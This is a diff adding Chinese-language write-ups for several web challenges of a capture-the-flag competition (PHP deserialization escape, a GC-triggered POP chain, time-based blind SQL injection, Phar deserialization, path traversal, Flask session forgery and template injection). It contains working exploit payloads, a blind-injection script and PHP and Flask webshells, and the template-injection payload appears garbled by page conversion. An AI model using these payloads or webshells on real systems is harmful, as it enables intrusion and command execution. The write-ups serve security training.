@@ -986,6 +986,540 @@ const result = await insert2db(merge(DEFAULT, data));
 }
 ```
 
+### \[Week 4]逃
+
+这题考察的是 PHP 反序列化逃逸。
+
+```php
+<?php
+highlight_file(__FILE__);
+function waf($str){
+    return str_replace("bad","good",$str);
+}
+
+class GetFlag {
+    public $key;
+    public $cmd = "whoami";
+    public function __construct($key)
+    {
+        $this->key = $key;
+    }
+    public function __destruct()
+    {
+        system($this->cmd);
+    }
+}
+
+unserialize(waf(serialize(new GetFlag($_GET['key']))));
+```
+
+可控的属性为 `key` ，并且可以通过 waf 中的替换来实现反序列化逃逸的效果。
+
+```php
+$getFlag = new GetFlag('');
+echo '<br>'.serialize($getFlag).'<br>';
+echo waf(serialize($getFlag)).'<br>';
+// O:7:"GetFlag":2:{s:3:"key";s:0:"";s:3:"cmd";s:6:"whoami";}
+// O:7:"GetFlag":2:{s:3:"key";s:0:"";s:3:"cmd";s:6:"whoami";}
+```
+
+需要通过逃逸构造出 `";s:3:"cmd";s:4:"ls /";}` 共 24 个字符，又因为 bad 替换成 good 后即增加一位，因此需要循环 24 次 bad 来进行逃逸。
+
+```php
+$getFlag = new GetFlag(str_repeat("bad", 24).'";s:3:"cmd";s:4:"ls /";}');
+echo '<br>'.serialize($getFlag).'<br>';
+echo waf(serialize($getFlag)).'<br>';
+// O:7:"GetFlag":2:{s:3:"key";s:96:"badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:4:"ls /";}";s:3:"cmd";s:6:"whoami";}
+// O:7:"GetFlag":2:{s:3:"key";s:96:"goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood";s:3:"cmd";s:4:"ls /";}";s:3:"cmd";s:6:"whoami";}
+```
+
+构造 Payload 如下
+
+```
+key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:4:"ls /";}
+```
+
+即可输出跟目录的内容，同理构造 Payload 如下
+
+```
+key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";}
+```
+
+即可得到 flag。
+
+### \[Week 4]More Fast
+
+* GC 回收
+
+```php
+<?php
+highlight_file(__FILE__);
+
+class Start{
+    public $errMsg;
+    public function __destruct() {
+        die($this->errMsg);
+    }
+}
+
+class Pwn{
+    public $obj;
+    public function __invoke(){
+        $this->obj->evil();
+    }
+    public function evil() {
+        phpinfo();
+    }
+}
+
+class Reverse{
+    public $func;
+    public function __get($var) {
+        ($this->func)();
+    }
+}
+
+class Web{
+    public $func;
+    public $var;
+    public function evil() {
+        if(!preg_match("/flag/i",$this->var)){
+            ($this->func)($this->var);
+        }else{
+            echo "Not Flag";
+        }
+    }
+}
+
+class Crypto{
+    public $obj;
+    public function __toString() {
+        $wel = $this->obj->good;
+        return "NewStar";
+    }
+}
+
+class Misc{
+    public function evil() {
+        echo "good job but nothing";
+    }
+}
+
+$a = @unserialize($_POST['fast']);
+throw new Exception("Nope");
+```
+
+> 在PHP中，使用 `引用计数` 和 `回收周期` 来自动管理内存对象的，当一个变量被设置为 `NULL` ，或者没有任何指针指向 时，它就会被变成垃圾，被 `GC` 机制自动回收掉 那么这里的话我们就可以理解为，当一个对象没有被引用时，就会被 `GC` 机制回收，在回收的过程中，它会自动触发 `_destruct` 方法，而这也就是我们绕过抛出异常的关键点。
+>
+> https://xz.aliyun.com/t/11843
+
+当 Unserialize 运行失败时，则会对运行中的已经创建出来的类进行销毁，提前触发 \_\_destruct 函数。
+
+触发 GC 机制的方法：
+
+* 对象被 unset() 函数处理；
+* 数组对象为 NULL 。
+
+```php
+<?php
+show_source(__FILE__);
+
+class B {
+  function __destruct() {
+    global $flag;
+    echo $flag;
+  }
+}
+
+$a=array(new B,0);
+
+echo serialize($a);
+
+// a:2:{i:0;O:1:"B":0:{}i:1;i:0;}
+// 数组:长度为2::{int型:长度0;类:长度为1:类名为"B":值为0 int型:值为1：int型;值为0
+```
+
+将第二个索引值设为空 ，就可以触发 GC 回收机制。
+
+POP 链如下：
+
+```
+Start::__destruct()->Crypto::__toString()->Reverse::__get($var)->Pwn::__invoke()->Web::evil()
+```
+
+```php
+$p = new Pwn();
+$p->obj = new Web;
+$p->obj->func = "system";
+$p->obj->var = "ls /";
+$r = new Reverse();
+$r->func = $p;
+$c = new Crypto();
+$c->obj = $r;
+$s = new Start();
+$s->errMsg = $c;
+
+$a = array($s, 0);
+echo serialize($a);
+// a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}}i:1;i:0;}
+```
+
+通过将第二个索引 `i:1` 修改为 `i:0` 即可出发 GC 回收机制，构造 Payload 如下
+
+```
+fast=a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:4:"ls /";}}}}}i:0;i:0;}
+```
+
+即可得到目录，再构造 Payload 如下即可得到 flag 。
+
+```
+fast=a:2:{i:0;O:5:"Start":1:{s:6:"errMsg";O:6:"Crypto":1:{s:3:"obj";O:7:"Reverse":1:{s:4:"func";O:3:"Pwn":1:{s:3:"obj";O:3:"Web":2:{s:4:"func";s:6:"system";s:3:"var";s:7:"cat /f*";}}}}}i:0;i:0;}
+```
+
+### \[Week 4]midsql
+
+```php
+$cmd = "select name, price from items where id = ".$_REQUEST["id"];
+$result = mysqli_fetch_all($result);
+$result = $result[0];
+```
+
+经过尝试无论输入什么正确的都只会回显 `你不会以为我真的会告诉你结果吧` ，猜测需要进行盲注，先通过构造不同的 Payload 判断哪些被进行了过滤需要进行绕过。
+
+经过测试，空格、等号被绕过了，可以通过 `/**/` 和 `like` 进行绕过。
+
+```python
+import time
+import socket
+import requests
+import requests.packages.urllib3.util.connection as urllib3_conn
+
+urllib3_conn.allowed_gai_family = lambda: socket.AF_INET
+
+session = requests.Session()
+def getDatabase():
+    results = []
+    for i in range(1, 1000):
+        print(f'{i}...')
+        start = -1 
+        end = 255
+        mid = -1
+        while start < end:
+            mid = (start + end) // 2
+            url = "http://c968b372-387a-4e4b-b157-b99e627c3a66.node5.buuoj.cn:81/"
+            params = {"id": f"1/**/and/**/if(ascii(substr(database(),{i},1))>{mid},sleep(1),1)#"}
+            ret = session.get(url, params=params)
+            assert ret.status_code == 200, f'code: {ret.status_code}'
+            assert '429 Too Many Requests' not in ret.text
+            if ret.elapsed.total_seconds() >= 1:
+                start = mid + 1
+            else:
+                end = mid
+            time.sleep(0.05)
+        if mid == -1:
+            break
+        results.append(chr(start))
+        print(''.join(results))
+    return ''.join(results)
+
+begin = time.time()
+getDatabase()
+print(f'time spend: {time.time() - begin}')
+
+"""
+1...
+c
+2...
+ct
+3...
+ctf
+4...
+time spend: 16.405414819717407
+"""
+```
+
+可以得出数据库名为 `ctf` 。
+
+```python
+params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'ctf'),{i},1))>{mid},sleep(1),1)#"}
+```
+
+可以得出表名为 `items` 。
+
+```python
+params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/'ctf'/**/and/**/table_name/**/like'items'),{i},1))>{mid},sleep(1),1)#"}
+```
+
+可以得出字段名为 `id,name,price` 。
+
+```python
+params = {"id": f"1/**/and/**/if(ascii(substr((select/**/group_concat(id,name,price)/**/from/**/ctf.items),{i},1))>{mid},sleep(1),1)#"}
+```
+
+可以得出值 `1lolita1000,520lolita's flag is flag{647190d8-7511-4386-b513-15440eb033be}1688` 。
+
+### \[Week 4]Flask Disk
+
+根据题目已知框架为 Flask ，通过 `admin manage` 已知开启了 Debug 模式，在该模式下修改 `app.py` 会立即加载，通过 Upload 上传新的 `app.py` 。
+
+```python
+from flask import *
+import os
+
+app = Flask(__name__)
+@app.route('/')
+
+def index():
+    try:
+        cmd = request.args.get('1')
+        data = os.popen(cmd).read()
+        return data
+    except:
+        pass
+
+    return "1"
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0',port=5000,debug=True)
+```
+
+上传后通过构造 Payload 获得 flag 。
+
+```
+1=cat /flag
+```
+
+### \[Week 4]PharOne
+
+查看源代码可以发现提示 `class.php` ，通过查看可以得到源码如下。
+
+```php
+<?php
+highlight_file(__FILE__);
+class Flag{
+    public $cmd;
+    public function __destruct()
+    {
+        @exec($this->cmd);
+    }
+}
+@unlink($_POST['file']);
+```
+
+结合标题可以通过 Phar 反序列化来写入 WebShell ，经过随机上传发现存在文件类型检测。
+
+```php
+<?php
+highlight_file(__FILE__);
+class Flag{
+    public $cmd;
+}
+
+$a=new Flag();
+$a->cmd="echo \"<?=@eval(\\\$_POST[1]);\">/var/www/html/1.php";
+$phar = new Phar("1.phar");
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+$phar->setMetadata($a);
+$phar->addFromString("test.txt", "test");
+$phar->stopBuffering();
+```
+
+通过上传发现存在过滤 `!preg_match("/__HALT_COMPILER/i",FILE_CONTENTS)` ，可以通过 gzip 压缩进行绕过。
+
+```shell
+$ gzip -f 1.phar
+$ mv 1.phar.gz 1.jpg
+```
+
+修改好后进行上传得到回显如下。
+
+```
+Saved to: upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg
+```
+
+再通过构造 Payload 如下即可上传恶意 WebShell 。
+
+```
+// class.php
+file=phar://upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg
+```
+
+此时通过构造 Payload 如下即可获得 flag 。
+
+```
+// 1.php
+1=system("cat /f*");
+```
+
+### \[Week 4]InjectMe
+
+附件：Dockerfile
+
+```
+FROM vulhub/flask:1.1.1
+ENV FLAG=flag{not_here}
+COPY src/ /app
+RUN mv /app/start.sh /start.sh && chmod 777 /start.sh
+CMD [ "/start.sh" ]
+EXPOSE 8080
+```
+
+可以得出站点目录在 `/app` 中，通过查看图片 `110.jpg` 可以得到部分源码。
+
+<figure><img src=".gitbook/assets/injectme-1.jpg" alt=""><figcaption></figcaption></figure>
+
+可以发现 `../` 被替换成了空，但是可以通过类似双写的方法进行绕过从而实现路径穿越，构造 Payload 如下。
+
+```
+/download?file=..././..././..././app/app.py
+```
+
+可以得到 `app.py` 的源码如下。
+
+```python
+import os
+import re
+
+from flask import Flask, render_template, request, abort, send_file, session, render_template_string
+from config import secret_key
+
+app = Flask(__name__)
+app.secret_key = secret_key
+
+
+@app.route('/')
+def hello_world():  # put application's code here
+    return render_template('index.html')
+
+
+@app.route("/cancanneed", methods=["GET"])
+def cancanneed():
+    all_filename = os.listdir('./static/img/')
+    filename = request.args.get('file', '')
+    if filename:
+        return render_template('img.html', filename=filename, all_filename=all_filename)
+    else:
+        return f"{str(os.listdir('./static/img/'))} <br> <a href=\"/cancanneed?file=1.jpg\">/cancanneed?file=1.jpg</a>"
+
+
+@app.route("/download", methods=["GET"])
+def download():
+    filename = request.args.get('file', '')
+    if filename:
+        filename = filename.replace('../', '')
+        filename = os.path.join('static/img/', filename)
+        print(filename)
+        if (os.path.exists(filename)) and ("start" not in filename):
+            return send_file(filename)
+        else:
+            abort(500)
+    else:
+        abort(404)
+
+
+@app.route('/backdoor', methods=["GET"])
+def backdoor():
+    try:
+        print(session.get("user"))
+        if session.get("user") is None:
+            session['user'] = "guest"
+        name = session.get("user")
+        if re.findall(
+                r'__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.',
+                name):
+            abort(500)
+        else:
+            return render_template_string(
+                '竟然给<h1>%s</h1>你找到了我的后门，你一定是网络安全大赛冠军吧！😝 <br> 那么 现在轮到你了!<br> 最后祝您玩得愉快!😁' % name)
+    except Exception:
+        abort(500)
+
+
+@app.errorhandler(404)
+def page_not_find(e):
+    return render_template('404.html'), 404
+
+
+@app.errorhandler(500)
+def internal_server_error(e):
+    return render_template('500.html'), 500
+
+
+if __name__ == '__main__':
+    app.run('0.0.0.0', port=8080)
+```
+
+通过分析 backdoor 函数可知需要进行 session 伪造来修改 `session['user']` ，通过源码可知 `secret_key` 位于 `config.py` 中，通过上述相同方法获取，回显如下。
+
+```
+secret_key = "y0u_n3ver_k0nw_s3cret_key_1s_newst4r"
+```
+
+```shell
+$ python .\flask_session_cookie_manager3.py decode -s "y0u_n3ver_k0nw_s3cret_key_1s_newst4r" -c "eyJ1c2VyIjoiZ3Vlc3QifQ.ZgfcyA.YhCEWdSzBAAgOIUh5lmFU
+AoCqDY"
+{'user': 'guest'}
+```
+
+成功 decode 后，还需要进行绕过，编写一个 Python 脚本如下。
+
+```python
+import subprocess
+import requests
+
+payload = '<div data-gb-custom-block data-tag="set" data-i=''></div><div data-gb-custom-block data-tag="print" data-0='24' data-1='24' data-2='24' data-3='24' data-4='24' data-5='24' data-6='24' data-7='2' data-8='2' data-9='2' data-10='g' data-11='' data-12='~i[24]*2][(' data-13='2' data-14='2' data-15='' data-16='' data-17='|select|string)[24]*2~' data-18='' data-19='' data-20='' data-21='~i[24]*2][i[24]*2~' data-22='2' data-23='2' data-24='import' data-25='~i[24]*2](' data-26='' data-27='s' data-28='p' data-29='' data-30='open' data-31='l' data-32='~' data-33='s' data-34='10' data-35='10' data-36='0' data-37='/' data-38='))[' data-39='read'></div>'
+
+def getSession():
+    command = ['python', 'flask_session_cookie_manager3.py', 'encode', '-t',
+               "{{'user':'{0}'}}".format(payload), '-s',
+               "y0u_n3ver_k0nw_s3cret_key_1s_newst4r"]
+    result = subprocess.run(command, capture_output=True, text=True)
+    output = result.stdout.strip()
+    return output
+
+
+a = getSession()
+print(a)
+
+url = "http://cc52e144-c6c3-4b89-abcc-472db5bf1e69.node5.buuoj.cn:81/backdoor"
+cookies = {"session": a}
+res = requests.get(url=url, cookies=cookies)
+print(res.text)
+
+"""
+竟然给<h1>app
+bin
+boot
+dev
+etc
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+start.sh
+sys
+tmp
+usr
+var
+y0U3_f14g_1s_h3re
+</h1>你找到了我的后门，你一定是网络安全大赛冠军吧！😝 <br> 那么 现在轮到你了!<br> 最后祝您玩得愉快!😁
+"""
+```
+
+发现成功绕过并且获得 flag 文件名 `y0U3_f14g_1s_h3re` ，通过修改脚本如下即可得到 flag 。
+
+```python
+payload = '<div data-gb-custom-block data-tag="set" data-i=''></div><div data-gb-custom-block data-tag="print" data-0='24' data-1='24' data-2='24' data-3='24' data-4='24' data-5='24' data-6='24' data-7='2' data-8='2' data-9='2' data-10='g' data-11='' data-12='~i[24]*2][(' data-13='2' data-14='2' data-15='' data-16='' data-17='|select|string)[24]*2~' data-18='' data-19='' data-20='' data-21='~i[24]*2][i[24]*2~' data-22='2' data-23='2' data-24='import' data-25='~i[24]*2](' data-26='' data-27='s' data-28='p' data-29='' data-30='open' data-31='c' data-32='~' data-33='at' data-34='10' data-35='10' data-36='0' data-37='/y0U3_f14g_1s_h3re' data-38='))[' data-39='read'></div>'
+```
+
 ## Misc
 
 ### \[Week 1]CyberChef's Secret
